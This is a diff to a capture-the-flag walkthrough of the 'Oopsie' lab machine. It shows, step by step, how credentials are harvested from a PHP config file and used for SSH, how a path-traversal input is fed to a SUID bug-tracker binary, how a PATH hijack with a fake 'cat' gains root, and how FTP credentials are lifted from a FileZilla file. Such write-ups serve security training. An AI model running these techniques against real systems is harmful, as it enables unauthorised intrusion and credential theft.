@@ -147,3 +147,137 @@ Access ID | Name | Email
     www-data@oopsie:/$ fg
     www-data@oopsie:/$ reset
     www-data@oopsie:/$ xterm
+
+// we got user flag !
+
+    www-data@oopsie:/home/robert$ cat user.txt
+    f2c74ee................
+
+// digging in the /var/www directory i have found robert's credentials 
+
+    www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
+    <?php
+    $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+    ?>
+// lets try to connect via ssh (Port 22) with those credentials
+
+    $ ssh robert@10.10.10.28
+    robert@10.10.10.28's password: M3g4C0rpUs3r!
+    Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)
+
+    robert@oopsie:~$ 
+
+// We have connection !
+
+## ----------Privilleges Escalation-----------
+
+// Checking sudo permissions for robert didnt work, we can try to check robert's group
+
+    robert@oopsie:~$ groups
+    robert bugtracker
+
+// can enumerate the filesystem to see if this group has any special access
+
+    robert@oopsie:/etc$ find / -type f -group bugtracker 2>/dev/null
+    /usr/bin/bugtracker
+    
+// we found a file 'bugtracker' with root permissions
+
+    robert@oopsie:~$ ls -al /usr/bin/bugtracker 
+    -rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
+// running the program
+
+    $ /usr/bin/bugtracker 
+    ------------------
+    : EV Bug Tracker :
+    ------------------
+
+    Provide Bug ID: 1
+    ---------------
+    Binary package hint: ev-engine-lib
+    Version: 3.3.3-1
+    Reproduce:
+    When loading library in firmware it seems to be crashed
+    What you expected to happen:
+    Synchronized browsing to be enabled since it is enabled for that site.
+
+    What happened instead:
+    Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
+// its seems like some bug reporting tool and its read from file we select.
+since we know the owner of the file is root then he runs in root and doing some 'cat' function, lets try to "cat root.txt"
+
+    robert@oopsie:~$ /usr/bin/bugtracker 
+
+    ------------------
+    : EV Bug Tracker :
+    ------------------
+
+    Provide Bug ID: ../root.txt
+    ---------------
+
+    af13b0b..................
+    
+// it worked !, now lets try to elevate to root, since we know bugtracker file that have root privilleges calling cat command with a relative PATH instead of an absolute one, that mean we can can make our own file named 'cat' that will executed instead the real one.
+we just need to add the directory that we will make the 'cat' file to the PATH first(i use /tmp/)
+
+    robert@oopsie:/tmp$ mkdir ...
+    robert@oopsie:/tmp$ cd ...
+    robert@oopsie:/tmp/...$ echo /bin/sh > cat
+    robert@oopsie:/tmp/...$ chmod +x cat 
+    robert@oopsie:/tmp/...$ export PATH=/tmp/...:$PATH
+    robert@oopsie:/tmp/...$ /usr/bin/bugtracker 
+    ------------------
+    : EV Bug Tracker :
+    ------------------
+
+    Provide Bug ID: 1
+    ---------------
+
+    # whoami && id
+    root
+    uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+
+
+// Post-Exploitation
+// checking root directory i found /.config directory
+
+    # ls -al
+    total 48
+    drwx------  8 root root 4096 Mar 20  2020 .
+    drwxr-xr-x 24 root root 4096 Jan 27  2020 ..
+    lrwxrwxrwx  1 root root    9 Jan 25  2020 .bash_history -> /dev/null
+    -rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+    drwx------  2 root root 4096 Jan 24  2020 .cache
+    drwxr-xr-x  3 root root 4096 Jan 25  2020 .config
+    drwx------  3 root root 4096 Jan 24  2020 .gnupg
+    drwxr-xr-x  3 root root 4096 Jan 23  2020 .local
+    -rw-r--r--  1 root root  148 Aug 17  2015 .profile
+    drwxr-xr-x  2 root root 4096 Jan 24  2020 reports
+    -rw-r--r--  1 root root   33 Feb 25  2020 root.txt
+    drwx------  2 root root 4096 Jan 23  2020 .ssh
+    -rw-------  1 root root 1325 Mar 20  2020 .viminfo
+
+    # cd /root/.config/filezilla
+    # cat filezilla.xml
+
+    <?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+    <FileZilla3>
+        <RecentServers>
+            <Server>
+                <Host>10.10.10.46</Host>
+                <Port>21</Port>
+                <Protocol>0</Protocol>
+                <Type>0</Type>
+                <User>ftpuser</User>
+                <Pass>mc@F1l3ZilL4</Pass>
+                <Logontype>1</Logontype>
+                <TimezoneOffset>0</TimezoneOffset>
+                <PasvMode>MODE_DEFAULT</PasvMode>
+                <MaximumMultipleConnections>0</MaximumMultipleConnections>
+                <EncodingType>Auto</EncodingType>
+                <BypassProxy>0</BypassProxy>
+            </Server>
+        </RecentServers>
+    </FileZilla3>
+
+// we got ftp credentials - ftpuser : mc@F1l3ZilL4
